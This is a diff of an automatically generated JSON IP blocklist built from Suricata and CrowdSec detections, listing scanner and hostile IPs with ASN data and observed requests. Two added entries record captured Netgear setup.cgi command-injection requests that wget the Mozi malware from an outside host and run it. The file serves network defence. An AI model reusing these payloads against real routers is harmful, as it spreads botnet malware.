@@ -1,163 +1,13 @@
 {
-  "generated_at": "2026-11-20T01:00:00Z",
+  "generated_at": "2026-11-20T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 109,
-    "v4": 109,
+    "total": 114,
+    "v4": 114,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "192.42.116.29",
-      "family": "v4",
-      "first_seen": "2026-11-13T11:00:00Z",
-      "last_seen": "2026-11-13T11:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Relay/Router (Not Exit) Node Traffic group 318"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "215125",
-      "asn_name": "Cyberology-AS Church of Cyberology",
-      "asn_prefix": "192.42.116.0/24"
-    },
-    {
-      "ip": "185.180.141.5",
-      "family": "v4",
-      "first_seen": "2026-11-13T11:00:00Z",
-      "last_seen": "2026-11-13T11:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA SSH invalid banner"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "21859",
-      "asn_name": "ZEN-ECN - Zenlayer Inc",
-      "asn_prefix": "185.180.141.0/24",
-      "tags": [
-        "mwl:scanner=\"internet-census\""
-      ]
-    },
-    {
-      "ip": "172.70.250.83",
-      "family": "v4",
-      "first_seen": "2026-11-13T11:00:00Z",
-      "last_seen": "2026-11-13T11:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "13335",
-      "asn_name": "CLOUDFLARENET - Cloudflare, Inc.",
-      "asn_prefix": "172.70.250.0/24",
-      "tags": [
-        "mwl:cdn=\"cloudflare\""
-      ],
-      "payloads": [
-        "GET /robots.txt"
-      ]
-    },
-    {
-      "ip": "54.219.132.8",
-      "family": "v4",
-      "first_seen": "2026-11-13T10:00:00Z",
-      "last_seen": "2026-11-13T10:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "16509",
-      "asn_name": "AMAZON-02 - Amazon.com, Inc.",
-      "asn_prefix": "54.219.128.0/18",
-      "tags": [
-        "mwl:cloud=\"aws\""
-      ],
-      "payloads": [
-        "GET /identity"
-      ]
-    },
-    {
-      "ip": "35.210.88.112",
-      "family": "v4",
-      "first_seen": "2026-11-13T07:00:00Z",
-      "last_seen": "2026-11-13T07:00:00Z",
-      "scenarios": [
-        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 15"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "15169",
-      "asn_name": "GOOGLE - Google LLC",
-      "asn_prefix": "35.210.0.0/16",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ]
-    },
-    {
-      "ip": "35.210.24.13",
-      "family": "v4",
-      "first_seen": "2026-11-13T07:00:00Z",
-      "last_seen": "2026-11-13T07:00:00Z",
-      "scenarios": [
-        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 15"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "15169",
-      "asn_name": "GOOGLE - Google LLC",
-      "asn_prefix": "35.210.0.0/16",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ]
-    },
-    {
-      "ip": "146.190.57.24",
-      "family": "v4",
-      "first_seen": "2026-11-13T05:00:00Z",
-      "last_seen": "2026-11-13T05:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "14061",
-      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
-      "asn_prefix": "146.190.32.0/19",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "20.118.235.128",
-      "family": "v4",
-      "first_seen": "2026-11-13T12:00:00Z",
-      "last_seen": "2026-11-13T12:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.64.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /actuator/health"
-      ]
-    },
     {
       "ip": "20.83.25.1",
       "family": "v4",
@@ -228,10 +78,7 @@
       ],
       "asn": "60729",
       "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
-      "asn_prefix": "185.220.101.0/24",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "185.220.101.0/24"
     },
     {
       "ip": "165.232.112.247",
@@ -1370,6 +1217,7 @@
         "suricata"
       ],
       "asn": "852",
+      "asn_name": "ASN852 - TELUS Communications Inc.",
       "asn_prefix": "66.222.128.0/18",
       "payloads": [
         "GET /identity"
@@ -1440,6 +1288,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "7922",
+      "asn_name": "COMCAST-7922 - Comcast Cable Communications, LLC",
+      "asn_prefix": "73.0.0.0/8",
       "payloads": [
         "GET /identity"
       ]
@@ -1455,6 +1306,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "7922",
+      "asn_name": "COMCAST-7922 - Comcast Cable Communications, LLC",
+      "asn_prefix": "73.0.0.0/8",
       "payloads": [
         "GET /identity"
       ]
@@ -1488,6 +1342,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "7018",
+      "asn_name": "ATT-INTERNET4 - AT&T Enterprises, LLC",
+      "asn_prefix": "23.112.0.0/12",
       "payloads": [
         "GET /identity"
       ]
@@ -1504,6 +1361,7 @@
         "suricata"
       ],
       "asn": "20115",
+      "asn_name": "CHARTER-20115 - Charter Communications LLC",
       "asn_prefix": "47.33.0.0/18",
       "payloads": [
         "GET /identity"
@@ -1610,6 +1468,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "4766",
+      "asn_name": "KIXS-AS-KR-KR - Korea Telecom",
+      "asn_prefix": "220.72.0.0/13",
       "payloads": [
         "GET /identity"
       ]
@@ -1858,6 +1719,8 @@
       "sources": [
         "suricata"
       ],
+      "asn": "5607",
+      "asn_prefix": "51.182.64.0/18",
       "payloads": [
         "GET /identity"
       ]
@@ -1948,6 +1811,238 @@
       "asn": "46690",
       "asn_name": "SNET-FCC - Southern New England Telephone Company and SNET America, Inc.",
       "asn_prefix": "32.208.0.0/12",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "222.134.170.14",
+      "family": "v4",
+      "first_seen": "2026-11-20T09:00:00Z",
+      "last_seen": "2026-11-20T09:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "4837",
+      "asn_name": "CHINA169-Backbone - CHINA UNICOM China169 Backbone",
+      "asn_prefix": "222.132.0.0/14",
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://222.134.170.14:42999/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.134.170.14:42999/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "223.123.34.110",
+      "family": "v4",
+      "first_seen": "2026-11-20T04:00:00Z",
+      "last_seen": "2026-11-20T04:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://223.123.34.110:58426/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://223.123.34.110:58426/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "184.148.44.218",
+      "family": "v4",
+      "first_seen": "2026-11-20T09:00:00Z",
+      "last_seen": "2026-11-20T09:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "577",
+      "asn_name": "BACOM - Bell Canada",
+      "asn_prefix": "184.148.0.0/16",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "102.220.161.85",
+      "family": "v4",
+      "first_seen": "2026-11-20T07:00:00Z",
+      "last_seen": "2026-11-20T07:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 1"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "197769",
+      "asn_name": "VPSDEDICATED-AS VPS Dedicated LLC",
+      "asn_prefix": "102.220.160.0/23"
+    },
+    {
+      "ip": "38.186.223.45",
+      "family": "v4",
+      "first_seen": "2026-11-20T06:00:00Z",
+      "last_seen": "2026-11-20T06:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "393442",
+      "asn_name": "UNITED-FIBER - United Electric Cooperative",
+      "asn_prefix": "38.186.220.0/22",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "96.240.131.247",
+      "family": "v4",
+      "first_seen": "2026-11-20T05:00:00Z",
+      "last_seen": "2026-11-20T05:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "701",
+      "asn_name": "UUNET - Verizon Business",
+      "asn_prefix": "96.240.128.0/20",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "4.150.194.120",
+      "family": "v4",
+      "first_seen": "2026-11-20T05:00:00Z",
+      "last_seen": "2026-11-20T05:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "4.144.0.0/12",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /portal/redlion"
+      ]
+    },
+    {
+      "ip": "72.94.9.30",
+      "family": "v4",
+      "first_seen": "2026-11-20T03:00:00Z",
+      "last_seen": "2026-11-20T03:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "701",
+      "asn_name": "UUNET - Verizon Business",
+      "asn_prefix": "72.94.0.0/16",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "50.126.206.166",
+      "family": "v4",
+      "first_seen": "2026-11-20T02:00:00Z",
+      "last_seen": "2026-11-20T02:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "71.174.80.46",
+      "family": "v4",
+      "first_seen": "2026-11-20T02:00:00Z",
+      "last_seen": "2026-11-20T02:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "701",
+      "asn_name": "UUNET - Verizon Business",
+      "asn_prefix": "71.174.0.0/16",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "174.75.29.52",
+      "family": "v4",
+      "first_seen": "2026-11-20T01:00:00Z",
+      "last_seen": "2026-11-20T01:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "22773",
+      "asn_prefix": "174.75.0.0/19",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "80.219.85.165",
+      "family": "v4",
+      "first_seen": "2026-11-20T01:00:00Z",
+      "last_seen": "2026-11-20T01:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "6730",
+      "asn_name": "SUNRISE Sunrise GmbH",
+      "asn_prefix": "80.219.0.0/16",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "50.37.184.229",
+      "family": "v4",
+      "first_seen": "2026-11-20T11:00:00Z",
+      "last_seen": "2026-11-20T11:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
       "payloads": [
         "GET /identity"
       ]
